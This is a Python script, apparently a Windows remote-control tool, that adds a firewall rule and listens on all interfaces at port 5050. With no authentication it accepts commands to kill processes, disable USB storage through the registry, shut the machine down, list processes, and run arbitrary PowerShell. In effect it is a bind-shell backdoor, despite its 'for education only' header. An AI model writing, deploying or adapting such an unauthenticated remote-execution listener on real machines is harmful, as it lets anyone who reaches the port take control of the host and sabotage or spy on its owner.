#Code Written By SayyadN
#Code For education only 
#date: 16-8-2025

import os 
import psutil
import winreg
import socket
import subprocess

#Set HOST Detials
HOST = "0.0.0.0" # Allow For ALL Nets
port = 5050

def open_port():
    rule_name = f"OpenPort{port}"
    command = f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=allow protocol=TCP localport={port}'
    os.system(command)
    print(f"Port {port} Opened in Windows Firewall")

#For Blocking APP
def app_block(app_name):
    try:
        for psci in psutil.process_iter(['pid' , 'name']):
            if psci.info['name'] == app_name :
                psci.kill()
                return f"App Blocked : True {app_name}"
    except Exception as e:
        return f"Error : {e}"

def usb_stop():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SYSTEM\CurrentControlSet\Services\USBSTOR", 0,
                            winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
        winreg.CloseKey(key)
        return "Usb Disabled"
    except Exception as e :
        return str(e)

def close_pc():
    time_to_shut = float(input("Please Enter Your Time (Time in Seconds) -> "))
    os.system(f"shutdown /s /t {time_to_shut}")

def list_running_apps():
    """Get list of running processes (apps)."""
    try:
        apps = []
        for proc in psutil.process_iter(['pid', 'name']):
            apps.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
        return "\n".join(apps[:50])  # نجيب أول 50 بس عشان ميبقاش ضخم
    except Exception as e:
        return f"Error: {e}"

def run_powershell(cmd):
    """Run any PowerShell command."""
    try:
        result = subprocess.check_output(["powershell", "-command", cmd], shell=True)
        return result.decode(errors="ignore")
    except Exception as e:
        return str(e)

def catch_cmd(cmd):
    if cmd.startswith("block "):
        return app_block(cmd.split(" ")[1])
    elif cmd == "usb_off": 
        return usb_stop()
    elif cmd == "shutdown":
        close_pc()
        return "Shutting down..."
    elif cmd == "list_apps":
        return list_running_apps()
    elif cmd.startswith("ps "):
        ps_cmd = cmd.replace("ps ", "", 1)
        return run_powershell(ps_cmd)
    else:
        return "Unknown Command"

#Using Socket Lib
with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as setup: 
    setup.bind((HOST , port))
    setup.listen()
    print(f"[+] Listening on {HOST}:{port}")
    while True:
        conn , adtr = setup.accept()
        with conn:
            data = conn.recv(1024).decode()
            if not data:
                break
            resp = catch_cmd(data)
            conn.sendall(resp.encode(errors="ignore"))
